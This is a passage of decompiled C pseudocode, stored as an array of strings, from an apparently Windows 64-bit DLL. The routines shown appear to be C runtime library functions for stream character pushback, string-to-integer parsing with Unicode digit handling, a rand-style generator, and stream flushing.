    "  v10 = *((_DWORD *)a2 + 5) >> 12;",
    "  v11 = (_BYTE *)(*a2 - 1);",
    "  *a2 = (__int64)v11;",
    "  if ( (v10 & 1) != 0 )",
    "  {",
    "    if ( *v11 != (_BYTE)a1 )",
    "    {",
    "      *a2 = v9;",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *v11 = a1;",
    "  }",
    "  ++*((_DWORD *)a2 + 4);",
    "  _InterlockedAnd((volatile signed __int32 *)a2 + 5, 0xFFFFFFF7);",
    "  _InterlockedOr((volatile signed __int32 *)a2 + 5, 1u);",
    "  return (unsigned __int8)a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E5FC(int a1, __int64 *a2)",
    "{",
    "  unsigned int v5; // edi",
    "",
    "  if ( a2 )",
    "  {",
    "    sub_180017470(a2);",
    "    v5 = sub_18001E4DC(a1, a2);",
    "    sub_18001747C(a2);",
    "    return v5;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E654(__int64 a1, unsigned __int8 **a2, unsigned int a3, unsigned __int8 a4)",
    "{",
    "  unsigned __int8 *v4; // r12",
    "  unsigned int v5; // ebp",
    "  int v6; // r15d",
    "  unsigned __int8 *v9; // rcx",
    "  unsigned int v10; // esi",
    "  unsigned int v11; // r14d",
    "  int v12; // edi",
    "  int v13; // eax",
    "  unsigned __int8 *v14; // rcx",
    "  char v15; // dl",
    "  unsigned __int8 *v16; // r8",
    "  int v17; // eax",
    "  int v18; // eax",
    "  unsigned int v19; // r9d",
    "  unsigned int v20; // ecx",
    "  unsigned __int8 *v21; // r8",
    "  unsigned int v22; // edx",
    "  BOOL v23; // ecx",
    "  bool v24; // cf",
    "  bool v25; // zf",
    "  unsigned __int8 *v26; // rax",
    "  int v28; // eax",
    "  int v29; // ecx",
    "  int v30; // edi",
    "  unsigned __int8 *v31; // rdx",
    "  unsigned __int8 *v32; // rax",
    "",
    "  v4 = *a2;",
    "  v5 = a3;",
    "  v6 = a4;",
    "  if ( !*a2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    goto LABEL_6;",
    "  }",
    "  if ( a3 && a3 - 2 > 0x22 )",
    "  {",
    "    *(_BYTE *)(a1 + 48) = 1;",
    "    *(_DWORD *)(a1 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a1);",
    "LABEL_6:",
    "    v9 = a2[1];",
    "    if ( v9 )",
    "      *(_QWORD *)v9 = *a2;",
    "    return 0;",
    "  }",
    "  v10 = *v4;",
    "  v11 = 0;",
    "  *a2 = v4 + 1;",
    "  if ( !*(_BYTE *)(a1 + 40) )",
    "    sub_180019E10(a1);",
    "  while ( (unsigned int)sub_18001E05C(v10, 8, (__int64 *)(a1 + 24)) )",
    "    v10 = *(*a2)++;",
    "  v12 = v6 | 2;",
    "  if ( (_BYTE)v10 != 45 )",
    "    v12 = v6;",
    "  if ( (((_BYTE)v10 - 43) & 0xFD) == 0 )",
    "    LOBYTE(v10) = *(*a2)++;",
    "  if ( (v5 & 0xFFFFFFEF) == 0 )",
    "  {",
    "    if ( (unsigned __int8)(v10 - 48) > 9u )",
    "    {",
    "      if ( (unsigned __int8)(v10 - 97) > 0x19u )",
    "      {",
    "        if ( (unsigned __int8)(v10 - 65) > 0x19u )",
    "          goto LABEL_31;",
    "        v13 = (char)v10 - 55;",
    "      }",
    "      else",
    "      {",
    "        v13 = (char)v10 - 87;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v13 = (char)v10 - 48;",
    "    }",
    "    if ( !v13 )",
    "    {",
    "      v14 = *a2;",
    "      v15 = **a2;",
    "      v16 = *a2 + 1;",
    "      *a2 = v16;",
    "      if ( ((v15 - 88) & 0xDF) != 0 )",
    "      {",
    "        *a2 = v14;",
    "        v17 = 8;",
    "        if ( v5 )",
    "          v17 = v5;",
    "        v5 = v17;",
    "        if ( v15 && *v14 != v15 )",
    "        {",
    "          *(_DWORD *)sub_18001A80C() = 22;",
    "          invalid_parameter_noinfo();",
    "        }",
    "        goto LABEL_35;",
    "      }",
    "      LOBYTE(v10) = *v16;",
    "      *a2 = v16 + 1;",
    "      v18 = 16;",
    "      goto LABEL_32;",
    "    }",
    "LABEL_31:",
    "    v18 = 10;",
    "LABEL_32:",
    "    if ( v5 )",
    "      v18 = v5;",
    "    v5 = v18;",
    "  }",
    "LABEL_35:",
    "  v19 = 0xFFFFFFFF / v5;",
    "  while ( 1 )",
    "  {",
    "    if ( (unsigned __int8)(v10 - 48) > 9u )",
    "    {",
    "      if ( (unsigned __int8)(v10 - 97) > 0x19u )",
    "        v20 = (unsigned __int8)(v10 - 65) > 0x19u ? -1 : (char)v10 - 55;",
    "      else",
    "        v20 = (char)v10 - 87;",
    "    }",
    "    else",
    "    {",
    "      v20 = (char)v10 - 48;",
    "    }",
    "    v21 = *a2;",
    "    if ( v20 >= v5 )",
    "      break;",
    "    LOBYTE(v10) = *v21;",
    "    v22 = v5 * v11 + v20;",
    "    v23 = v22 < v5 * v11;",
    "    v24 = v11 < v19;",
    "    v25 = v11 == v19;",
    "    v11 = v22;",
    "    *a2 = v21 + 1;",
    "    v12 |= (4 * (!v24 && !v25 || v23)) | 8;",
    "  }",
    "  *a2 = v21 - 1;",
    "  if ( (_BYTE)v10 && *(v21 - 1) != (_BYTE)v10 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  if ( (v12 & 8) == 0 )",
    "  {",
    "    v26 = a2[1];",
    "    *a2 = v4;",
    "    if ( v26 )",
    "      *(_QWORD *)v26 = v4;",
    "    return 0;",
    "  }",
    "  if ( (v12 & 4) != 0 )",
    "  {",
    "    v28 = 1;",
    "    v29 = v12;",
    "    goto LABEL_60;",
    "  }",
    "  if ( (v12 & 1) == 0 )",
    "  {",
    "    if ( (v12 & 2) == 0 )",
    "      goto LABEL_71;",
    "    goto LABEL_70;",
    "  }",
    "  if ( (v12 & 2) == 0 )",
    "  {",
    "    if ( v11 <= 0x7FFFFFFF )",
    "    {",
    "LABEL_71:",
    "      v32 = a2[1];",
    "      if ( v32 )",
    "        *(_QWORD *)v32 = *a2;",
    "      return v11;",
    "    }",
    "    goto LABEL_59;",
    "  }",
    "  if ( v11 <= 0x80000000 )",
    "  {",
    "LABEL_70:",
    "    v11 = -v11;",
    "    goto LABEL_71;",
    "  }",
    "LABEL_59:",
    "  v29 = 1;",
    "  v28 = v12;",
    "LABEL_60:",
    "  v30 = v12 & 2;",
    "  *(_BYTE *)(a1 + 48) = 1;",
    "  *(_DWORD *)(a1 + 44) = 34;",
    "  if ( (v29 & v28) == 0 )",
    "  {",
    "    v11 = -1;",
    "    goto LABEL_71;",
    "  }",
    "  v31 = a2[1];",
    "  if ( v30 )",
    "  {",
    "    if ( v31 )",
    "      *(_QWORD *)v31 = *a2;",
    "    return 0x80000000LL;",
    "  }",
    "  else",
    "  {",
    "    if ( v31 )",
    "      *(_QWORD *)v31 = *a2;",
    "    return 0x7FFFFFFF;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E944(__int64 a1, __int16 **a2, unsigned int a3, unsigned __int8 a4)",
    "{",
    "  __int16 *v4; // r12",
    "  int v5; // esi",
    "  unsigned int v6; // r15d",
    "  __int16 *v8; // rcx",
    "  unsigned __int16 v9; // bx",
    "  unsigned int v10; // r14d",
    "  int v11; // eax",
    "  int v12; // esi",
    "  int v13; // ecx",
    "  int v14; // eax",
    "  int v15; // ecx",
    "  unsigned int v16; // eax",
    "  __int16 *v17; // rcx",
    "  __int16 v18; // dx",
    "  __int16 *v19; // r8",
    "  int v20; // eax",
    "  unsigned int v21; // r9d",
    "  unsigned int v22; // ecx",
    "  int v23; // eax",
    "  int v24; // eax",
    "  int v25; // ecx",
    "  __int16 *v26; // r8",
    "  unsigned int v27; // edx",
    "  BOOL v28; // ecx",
    "  bool v29; // cf",
    "  bool v30; // zf",
    "  __int16 *v31; // rax",
    "  int v33; // eax",
    "  int v34; // ecx",
    "  __int16 *v35; // rdx",
    "  __int16 *v36; // rdx",
    "  __int16 *v37; // [rsp+90h] [rbp-48h]",
    "",
    "  v4 = *a2;",
    "  v5 = a4;",
    "  v6 = a3;",
    "  v37 = *a2;",
    "  if ( !*a2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    goto LABEL_6;",
    "  }",
    "  if ( a3 && a3 - 2 > 0x22 )",
    "  {",
    "    *(_BYTE *)(a1 + 48) = 1;",
    "    *(_DWORD *)(a1 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a1);",
    "LABEL_6:",
    "    v8 = a2[1];",
    "    if ( v8 )",
    "      *(_QWORD *)v8 = *a2;",
    "    return 0;",
    "  }",
    "  v9 = *v4;",
    "  *a2 = v4 + 1;",
    "  v10 = 0;",
    "  if ( !*(_BYTE *)(a1 + 40) )",
    "    sub_180019E10(a1);",
    "  while ( (unsigned int)sub_180027EDC(v9, 8) )",
    "    v9 = *(*a2)++;",
    "  v11 = v5;",
    "  v12 = v5 | 2;",
    "  if ( v9 != 45 )",
    "    v12 = v11;",
    "  if ( ((v9 - 43) & 0xFFFD) == 0 )",
    "    v9 = *(*a2)++;",
    "  v13 = 48;",
    "  if ( (v6 & 0xFFFFFFEF) != 0 )",
    "    goto LABEL_73;",
    "  if ( v9 >= 0x30u )",
    "  {",
    "    if ( v9 < 0x3Au )",
    "    {",
    "LABEL_19:",
    "      v14 = v9 - v13;",
    "      goto LABEL_60;",
    "    }",
    "    if ( v9 >= 0xFF10u )",
    "    {",
    "      if ( v9 < 0xFF1Au )",
    "      {",
    "        v14 = v9 - 65296;",
    "LABEL_60:",
    "        if ( v14 != -1 )",
    "          goto LABEL_66;",
    "      }",
    "    }",
    "    else if ( v9 >= 0x660u )",
    "    {",
    "      if ( v9 < 0x66Au )",
    "      {",
    "        v14 = v9 - 1632;",
    "        goto LABEL_60;",
    "      }",
    "      if ( v9 >= 0x6F0u )",
    "      {",
    "        if ( v9 < 0x6FAu )",
    "        {",
    "          v14 = v9 - 1776;",
    "          goto LABEL_60;",
    "        }",
    "        if ( v9 >= 0x966u )",
    "        {",
    "          if ( v9 < 0x970u )",
    "          {",
    "            v14 = v9 - 2406;",
    "            goto LABEL_60;",
    "          }",
    "          if ( v9 >= 0x9E6u )",
    "          {",
    "            if ( v9 < 0x9F0u )",
    "            {",
    "              v14 = v9 - 2534;",
    "              goto LABEL_60;",
    "            }",
    "            if ( v9 >= 0xA66u )",
    "            {",
    "              if ( v9 < 0xA70u )",
    "              {",
    "                v14 = v9 - 2662;",
    "                goto LABEL_60;",
    "              }",
    "              v13 = 2790;",
    "              if ( v9 >= 0xAE6u )",
    "              {",
    "                if ( v9 < 0xAF0u )",
    "                  goto LABEL_19;",
    "                v13 = 2918;",
    "                if ( v9 >= 0xB66u )",
    "                {",
    "                  if ( v9 < 0xB70u )",
    "                    goto LABEL_19;",
    "                  v13 = 3174;",
    "                  if ( v9 >= 0xC66u )",
    "                  {",
    "                    if ( v9 < 0xC70u )",
    "                      goto LABEL_19;",
    "                    v13 = 3302;",
    "                    if ( v9 >= 0xCE6u )",
    "                    {",
    "                      if ( v9 < 0xCF0u )",
    "                        goto LABEL_19;",
    "                      v13 = 3430;",
    "                      if ( v9 >= 0xD66u )",
    "                      {",
    "                        if ( v9 < 0xD70u )",
    "                          goto LABEL_19;",
    "                        v13 = 3664;",
    "                        if ( v9 >= 0xE50u )",
    "                        {",
    "                          if ( v9 < 0xE5Au )",
    "                            goto LABEL_19;",
    "                          v13 = 3792;",
    "                          if ( v9 >= 0xED0u )",
    "                          {",
    "                            if ( v9 < 0xEDAu )",
    "                              goto LABEL_19;",
    "                            v13 = 3872;",
    "                            if ( v9 >= 0xF20u )",
    "                            {",
    "                              if ( v9 < 0xF2Au )",
    "                                goto LABEL_19;",
    "                              v13 = 4160;",
    "                              if ( v9 >= 0x1040u )",
    "                              {",
    "                                if ( v9 < 0x104Au )",
    "                                  goto LABEL_19;",
    "                                v13 = 6112;",
    "                                if ( v9 >= 0x17E0u )",
    "                                {",
    "                                  if ( v9 < 0x17EAu )",
    "                                    goto LABEL_19;",
    "                                  v13 = 6160;",
    "                                  if ( (unsigned __int16)(v9 - 6160) <= 9u )",
    "                                    goto LABEL_19;",
    "                                }",
    "                              }",
    "                            }",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "        }",
    "      }",
    "    }",
    "  }",
    "  v15 = v9;",
    "  v16 = v9 - 97;",
    "  if ( (unsigned int)v9 - 65 > 0x19 && v16 > 0x19 )",
    "    goto LABEL_81;",
    "  if ( v16 <= 0x19 )",
    "    v15 = v9 - 32;",
    "  v14 = v15 - 55;",
    "LABEL_66:",
    "  if ( v14 )",
    "  {",
    "LABEL_81:",
    "    v23 = 10;",
    "    goto LABEL_78;",
    "  }",
    "  v17 = *a2;",
    "  v18 = **a2;",
    "  v19 = *a2 + 1;",
    "  *a2 = v19;",
    "  if ( ((v18 - 88) & 0xFFDF) == 0 )",
    "  {",
    "    v9 = *v19;",
    "    *a2 = v19 + 1;",
    "    v23 = 16;",
    "LABEL_78:",
    "    if ( v6 )",
    "      v23 = v6;",
    "    v6 = v23;",
    "    goto LABEL_73;",
    "  }",
    "  *a2 = v17;",
    "  v20 = 8;",
    "  if ( v6 )",
    "    v20 = v6;",
    "  v6 = v20;",
    "  if ( v18 && *v17 != v18 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "LABEL_73:",
    "  v21 = 0xFFFFFFFF / v6;",
    "  while ( 1 )",
    "  {",
    "    if ( v9 >= 0x30u )",
    "    {",
    "      if ( v9 < 0x3Au )",
    "      {",
    "        v22 = v9 - 48;",
    "        goto LABEL_119;",
    "      }",
    "      if ( v9 >= 0xFF10u )",
    "      {",
    "        if ( v9 < 0xFF1Au )",
    "        {",
    "          v22 = v9 - 65296;",
    "LABEL_119:",
    "          if ( v22 != -1 )",
    "            goto LABEL_128;",
    "        }",
    "      }",
    "      else if ( v9 >= 0x660u )",
    "      {",
    "        if ( v9 < 0x66Au )",
    "        {",
    "          v22 = v9 - 1632;",
    "          goto LABEL_119;",
    "        }",
    "        v24 = 1776;",
    "        if ( v9 >= 0x6F0u )",
    "        {",
    "          if ( v9 < 0x6FAu )",
    "            goto LABEL_88;",
    "          v24 = 2406;",
    "          if ( v9 >= 0x966u )",
    "          {",
    "            if ( v9 < 0x970u )",
    "              goto LABEL_88;",
    "            v24 = 2534;",
    "            if ( v9 >= 0x9E6u )",
    "            {",
    "              if ( v9 < 0x9F0u )",
    "                goto LABEL_88;",
    "              v24 = 2662;",
    "              if ( v9 >= 0xA66u )",
    "              {",
    "                if ( v9 < 0xA70u )",
    "                  goto LABEL_88;",
    "                v24 = 2790;",
    "                if ( v9 >= 0xAE6u )",
    "                {",
    "                  if ( v9 < 0xAF0u )",
    "                    goto LABEL_88;",
    "                  v24 = 2918;",
    "                  if ( v9 >= 0xB66u )",
    "                  {",
    "                    if ( v9 < 0xB70u )",
    "                      goto LABEL_88;",
    "                    v24 = 3174;",
    "                    if ( v9 >= 0xC66u )",
    "                    {",
    "                      if ( v9 < 0xC70u )",
    "                        goto LABEL_88;",
    "                      v24 = 3302;",
    "                      if ( v9 >= 0xCE6u )",
    "                      {",
    "                        if ( v9 < 0xCF0u )",
    "                          goto LABEL_88;",
    "                        v24 = 3430;",
    "                        if ( v9 >= 0xD66u )",
    "                        {",
    "                          if ( v9 < 0xD70u )",
    "                            goto LABEL_88;",
    "                          v24 = 3664;",
    "                          if ( v9 >= 0xE50u )",
    "                          {",
    "                            if ( v9 < 0xE5Au )",
    "                              goto LABEL_88;",
    "                            v24 = 3792;",
    "                            if ( v9 >= 0xED0u )",
    "                            {",
    "                              if ( v9 < 0xEDAu )",
    "                                goto LABEL_88;",
    "                              v24 = 3872;",
    "                              if ( v9 >= 0xF20u )",
    "                              {",
    "                                if ( v9 < 0xF2Au )",
    "                                  goto LABEL_88;",
    "                                v24 = 4160;",
    "                                if ( v9 >= 0x1040u )",
    "                                {",
    "                                  if ( v9 < 0x104Au )",
    "                                    goto LABEL_88;",
    "                                  v24 = 6112;",
    "                                  if ( v9 >= 0x17E0u )",
    "                                  {",
    "                                    if ( v9 < 0x17EAu )",
    "                                    {",
    "LABEL_88:",
    "                                      v22 = v9 - v24;",
    "                                      goto LABEL_119;",
    "                                    }",
    "                                    if ( (unsigned __int16)(v9 - 6160) <= 9u )",
    "                                    {",
    "                                      v22 = v9 - 6160;",
    "                                      goto LABEL_119;",
    "                                    }",
    "                                  }",
    "                                }",
    "                              }",
    "                            }",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "        }",
    "      }",
    "    }",
    "    if ( ((v25 = v9, v9 < 0x41u) || v9 > 0x5Au) && (v9 < 0x61u || v9 > 0x7Au) )",
    "    {",
    "      v22 = -1;",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned __int16)(v9 - 97) <= 0x19u )",
    "        v25 = v9 - 32;",
    "      v22 = v25 - 55;",
    "    }",
    "LABEL_128:",
    "    v26 = *a2;",
    "    if ( v22 >= v6 )",
    "      break;",
    "    v9 = *v26;",
    "    v27 = v6 * v10 + v22;",
    "    v28 = v27 < v6 * v10;",
    "    v29 = v10 < v21;",
    "    v30 = v10 == v21;",
    "    v10 = v27;",
    "    *a2 = v26 + 1;",
    "    v12 |= (4 * (!v29 && !v30 || v28)) | 8;",
    "  }",
    "  *a2 = v26 - 1;",
    "  if ( v9 && *(v26 - 1) != v9 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  if ( (v12 & 8) != 0 )",
    "  {",
    "    if ( (v12 & 4) != 0 )",
    "    {",
    "      v33 = 1;",
    "      v34 = v12;",
    "LABEL_145:",
    "      *(_BYTE *)(a1 + 48) = 1;",
    "      *(_DWORD *)(a1 + 44) = 34;",
    "      if ( (v34 & v33) != 0 )",
    "      {",
    "        v35 = a2[1];",
    "        if ( (v12 & 2) != 0 )",
    "        {",
    "          if ( v35 )",
    "            *(_QWORD *)v35 = *a2;",
    "          return 0x80000000LL;",
    "        }",
    "        else",
    "        {",
    "          if ( v35 )",
    "            *(_QWORD *)v35 = *a2;",
    "          return 0x7FFFFFFF;",
    "        }",
    "      }",
    "      v10 = -1;",
    "LABEL_156:",
    "      v36 = a2[1];",
    "      if ( v36 )",
    "        *(_QWORD *)v36 = *a2;",
    "      return v10;",
    "    }",
    "    if ( (v12 & 1) != 0 )",
    "    {",
    "      if ( (v12 & 2) == 0 )",
    "      {",
    "        if ( v10 <= 0x7FFFFFFF )",
    "          goto LABEL_156;",
    "        goto LABEL_144;",
    "      }",
    "      if ( v10 > 0x80000000 )",
    "      {",
    "LABEL_144:",
    "        v34 = 1;",
    "        v33 = v12;",
    "        goto LABEL_145;",
    "      }",
    "    }",
    "    else if ( (v12 & 2) == 0 )",
    "    {",
    "      goto LABEL_156;",
    "    }",
    "    v10 = -v10;",
    "    goto LABEL_156;",
    "  }",
    "  v31 = a2[1];",
    "  *a2 = v37;",
    "  if ( v31 )",
    "    *(_QWORD *)v31 = v37;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F0E0(unsigned __int8 *a1, unsigned __int8 *a2, unsigned int a3)",
    "{",
    "  unsigned int v3; // edi",
    "  int v4; // ebx",
    "  int v5; // ebx",
    "  unsigned __int8 *v7[2]; // [rsp+20h] [rbp-50h] BYREF",
    "  _QWORD v8[2]; // [rsp+30h] [rbp-40h] BYREF",
    "  char v9; // [rsp+40h] [rbp-30h]",
    "  __int128 v10; // [rsp+48h] [rbp-28h]",
    "  char v11; // [rsp+58h] [rbp-18h]",
    "  int v12; // [rsp+5Ch] [rbp-14h]",
    "  char v13; // [rsp+60h] [rbp-10h]",
    "  int v14; // [rsp+64h] [rbp-Ch]",
    "  char v15; // [rsp+68h] [rbp-8h]",
    "",
    "  v8[0] = 0;",
    "  v9 = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  v15 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v11 = 1;",
    "    v10 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v7[0] = a1;",
    "  v7[1] = a2;",
    "  if ( a2 )",
    "    *(_QWORD *)a2 = a1;",
    "  v3 = sub_18001E654((__int64)v8, v7, a3, 1u);",
    "  if ( v11 == 2 )",
    "    *(_DWORD *)(v8[0] + 936LL) &= ~2u;",
    "  if ( v13 )",
    "  {",
    "    v4 = v12;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v8) + 32) = v4;",
    "  }",
    "  if ( v15 )",
    "  {",
    "    v5 = v14;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v8) + 36) = v5;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 sub_18001F194()",
    "{",
    "  __int64 v0; // rax",
    "  unsigned int v1; // ecx",
    "",
    "  v0 = sub_1800262FC();",
    "  v1 = 214013 * *(_DWORD *)(v0 + 40) + 2531011;",
    "  *(_DWORD *)(v0 + 40) = v1;",
    "  return HIWORD(v1) & 0x7FFF;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F1C0(__int64 a1, _QWORD *a2, __int64 **a3, _QWORD *a4)",
    "{",
    "  __int64 *v6; // rdx",
    "  __int64 v7; // rcx",
    "  int v8; // ecx",
    "",
    "  sub_180017470(*a2);",
    "  v6 = a3[1];",
    "  v7 = **a3;",
    "  if ( v7 )",
    "  {",
    "    v8 = *(_DWORD *)(v7 + 20);",
    "    if ( (v8 & 0x2000) != 0 )",
    "    {",
    "      if ( (v8 & 3) == 2 && (v8 & 0xC0) != 0 || (v8 & 0x800) != 0 )",
    "      {",
    "        if ( *(_BYTE *)a3[2] || (*(_DWORD *)(**a3 + 20) & 2) != 0 )",
    "        {",
    "          if ( (unsigned int)sub_18001F46C(**a3, v6) == -1 )",
    "            *(_DWORD *)a3[3] = -1;",
    "          else",
    "            ++*(_DWORD *)a3[1];",
    "        }",
    "      }",
    "      else",
    "      {",
    "        ++*(_DWORD *)v6;",
    "      }",
    "    }",
    "  }",
    "  return sub_18001747C(*a4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F25C(__int64 a1, unsigned int *a2, __int64 **a3, unsigned int *a4)",
    "{",
    "  __int64 *v6; // rbx",
    "  __int64 v7; // r14",
    "  __int64 v8; // rax",
    "  int v9; // ecx",
    "  __int64 *v10; // rdx",
    "  __int64 *v11; // rcx",
    "  __int64 *v12; // rax",
    "  __int64 v14; // [rsp+20h] [rbp-58h] BYREF",
    "  __int64 v15; // [rsp+28h] [rbp-50h] BYREF",
    "  _QWORD v16[2]; // [rsp+30h] [rbp-48h] BYREF",
    "  __int64 *v17[7]; // [rsp+40h] [rbp-38h] BYREF",
    "  char v18; // [rsp+88h] [rbp+10h] BYREF",
    "  unsigned int *v19; // [rsp+98h] [rbp+20h]",
    "",
    "  v19 = a4;",
    "  sub_1800209E8(*a2);",
    "  v6 = *(__int64 **)&qword_18004D2D8.ControlWord;",
    "  v7 = *(_QWORD *)&qword_18004D2D8.ControlWord + 8LL * dword_18004D2D0;",
    "  while ( 1 )",
    "  {",
    "    v16[1] = v6;",
    "    if ( v6 == (__int64 *)v7 )",
    "      break;",
    "    v8 = *v6;",
    "    v14 = v8;",
    "    if ( v8 )",
    "    {",
    "      v9 = *(_DWORD *)(v8 + 20);",
    "      if ( (v9 & 0x2000) != 0 )",
    "      {",
    "        if ( (v9 & 3) == 2 && (v9 & 0xC0) != 0 || (v9 & 0x800) != 0 )",
    "        {",
    "          v10 = a3[2];",
    "          v11 = a3[1];",
    "          v12 = *a3;",
    "          v17[0] = &v14;",
    "          v17[1] = v12;",
    "          v17[2] = v11;",
    "          v17[3] = v10;",
    "          v15 = v14;",
    "          v16[0] = v14;",
    "          sub_18001F1C0((__int64)&v18, v16, v17, &v15);",
    "        }",
    "        else",
    "        {",
    "          ++*(_DWORD *)*a3;",
    "        }",
    "      }",
    "    }",
    "    ++v6;",
    "  }",
    "  return sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F340(__int64 a1, _QWORD *a2, _QWORD **a3, _QWORD *a4)",
    "{",
    "  __int64 v6; // rdx",
    "",
    "  sub_180017470(*a2);",
    "  LODWORD(a3) = sub_18001F46C(**a3, v6);",
    "  sub_18001747C(*a4);",
    "  return (unsigned int)a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F380(char a1)",
    "{",
    "  __int64 result; // rax",
    "  unsigned int v2; // [rsp+20h] [rbp-20h] BYREF",
    "  unsigned int v3; // [rsp+24h] [rbp-1Ch] BYREF",
    "  __int64 *v4[3]; // [rsp+28h] [rbp-18h] BYREF",
    "  char v5; // [rsp+50h] [rbp+10h] BYREF",
    "  char v6; // [rsp+58h] [rbp+18h] BYREF",
    "  unsigned int v7; // [rsp+60h] [rbp+20h] BYREF",
    "  unsigned int v8; // [rsp+68h] [rbp+28h] BYREF",
    "",
    "  v5 = a1;",
    "  v8 = 0;",
    "  v7 = 0;",
    "  v4[0] = (__int64 *)&v8;",
    "  v4[1] = (__int64 *)&v5;",
    "  v4[2] = (__int64 *)&v7;",
    "  v2 = 8;",
    "  v3 = 8;",
    "  sub_18001F25C((__int64)&v6, &v3, v4, &v2);",
    "  result = v7;",
    "  if ( v5 )",
    "    return v8;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F3E0(__int64 a1, __int64 a2)",
    "{",
    "  int v4; // ecx",
    "  int v5; // edi",
    "  __int64 v6; // rsi",
    "  unsigned int v7; // eax",
    "",
    "  v4 = *(_DWORD *)(a1 + 20);",
    "  if ( (v4 & 3) == 2 && (v4 & 0xC0) != 0 )",
    "  {",
    "    v5 = *(_DWORD *)a1 - *(_DWORD *)(a1 + 8);",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "    v6 = *(_QWORD *)(a1 + 8);",
    "    *(_QWORD *)a1 = v6;",
    "    if ( v5 > 0 )",
    "    {",
    "      v7 = sub_180025DAC(a1);",
    "      if ( v5 != (unsigned int)sub_180028E38(v7, v6, (unsigned int)v5, a2) )",
    "      {",
    "        _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x10u);",
    "        return 0xFFFFFFFFLL;",
    "      }",
    "      if ( (*(_DWORD *)(a1 + 20) & 4) != 0 )",
    "        _InterlockedAnd((volatile signed __int32 *)(a1 + 20), 0xFFFFFFFD);",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F46C(__int64 a1)",
    "{",
    "  unsigned int v2; // edi",
    "  unsigned int v3; // eax",
    "  int v4; // ebx",
    "  int v5; // ebx",
    "  _QWORD v7[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v8; // [rsp+30h] [rbp-30h]",
    "  __int128 v9; // [rsp+38h] [rbp-28h]",
    "  char v10; // [rsp+48h] [rbp-18h]",
    "  int v11; // [rsp+4Ch] [rbp-14h]",
    "  char v12; // [rsp+50h] [rbp-10h]",
    "  int v13; // [rsp+54h] [rbp-Ch]",
    "  char v14; // [rsp+58h] [rbp-8h]",
    "",
    "  v7[0] = 0;",
    "  v8 = 0;",
    "  v10 = 0;",
    "  v12 = 0;",
    "  v14 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v10 = 1;",
    "    v9 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  if ( a1 )",
    "  {",
    "    if ( (unsigned int)sub_18001F3E0(a1, (__int64)v7)",
    "      || (*(_DWORD *)(a1 + 20) & 0x800) != 0 && (v3 = sub_180025DAC(a1), (unsigned int)sub_180028504(v3)) )",
    "    {",
    "      v2 = -1;",
    "    }",
    "    else",
    "    {",
    "      v2 = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v2 = sub_18001F380(0);",
    "  }",
    "  if ( v10 == 2 )",
    "    *(_DWORD *)(v7[0] + 936LL) &= ~2u;",
    "  if ( v12 )",
    "  {",
    "    v4 = v11;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 32) = v4;",
    "  }",
    "  if ( v14 )",
    "  {",
    "    v5 = v13;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v7) + 36) = v5;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 sub_18001F540()",
    "{",
    "  return sub_18001F380(1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001F548(__int64 a1)",
    "{",
    "  int v2; // edx",
    "  _QWORD v3[3]; // [rsp+20h] [rbp-18h] BYREF",
    "  char v4; // [rsp+40h] [rbp+8h] BYREF",
    "  __int64 v5; // [rsp+48h] [rbp+10h] BYREF",
    "  __int64 v6; // [rsp+50h] [rbp+18h] BYREF",
    "  __int64 *v7; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  v5 = a1;",
    "  if ( !a1 )",
    "    return sub_18001F380(0);",
    "  v2 = *(_DWORD *)(a1 + 20);",
    "  if ( ((v2 & 3) != 2 || (v2 & 0xC0) == 0) && (v2 & 0x800) == 0 )",
    "    return 0;",
    "  v7 = &v5;",
    "  v6 = v5;",
    "  v3[0] = v5;",
    "  return sub_18001F340((__int64)&v4, v3, &v7, &v6);",
